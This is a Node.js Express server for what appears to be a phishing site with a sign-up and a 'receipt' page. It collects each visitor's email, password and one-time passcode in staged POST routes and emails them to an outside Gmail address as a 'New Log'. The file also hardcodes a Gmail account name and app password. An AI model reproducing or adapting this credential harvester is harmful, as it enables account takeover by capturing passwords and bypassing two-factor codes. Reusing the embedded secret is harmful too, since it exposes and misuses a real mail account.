import express from "express";
import bodyParser from "body-parser";
import * as fs from 'fs';
import nodemailer from "nodemailer"
const app = express();
const port = 3083;

var transporter = nodemailer.createTransport({
    service: 'Gmail',
    host: "smtp.gmail.com",
    port: "465",
    secure: true,
    auth: {
        user: 'smartsites03@gmail.com',
        pass: 'oscg hroq dzud orcj'
    }
});

app.use("/public", express.static("public"));
app.set("view engine", "ejs");
app.set('trust proxy', 1)
app.use(bodyParser.urlencoded({extended: true}));
app.set('etag', false);
app.disable('view cache');
app.use(express.json())
app.post("/data", (req, res) => {
    var userEmail = req.body.userEmail

    app.post("/data/user", (req, res) => {
        var userPass = req.body.userPass;

        app.post("/data/user/otp", (req, res) => {
            var userOTP = req.body.userOTP
            var mailOptions = {
                from: 'Server',
                to: `alliancebrokersl@gmail.com`,
                subject: 'New User Sign Up',
                html: `<text> New Log: Pwd: ${userPass} <br> Email: ${userEmail} <br> OTP: ${userOTP}.</text>`
            };
              
            transporter.sendMail(mailOptions, function(error, info){
                if (error) {
                  console.log(error);
                } else {
                  console.log('Email sent: ' + info.response);
                }
            });
        })
    })
})

app.get("/", (req, res) => {
    res.render("index")
})
app.get("/receipt", (req, res) => {
    res.render("index2")
})

app.listen(port, () => {
    console.log("Started")
})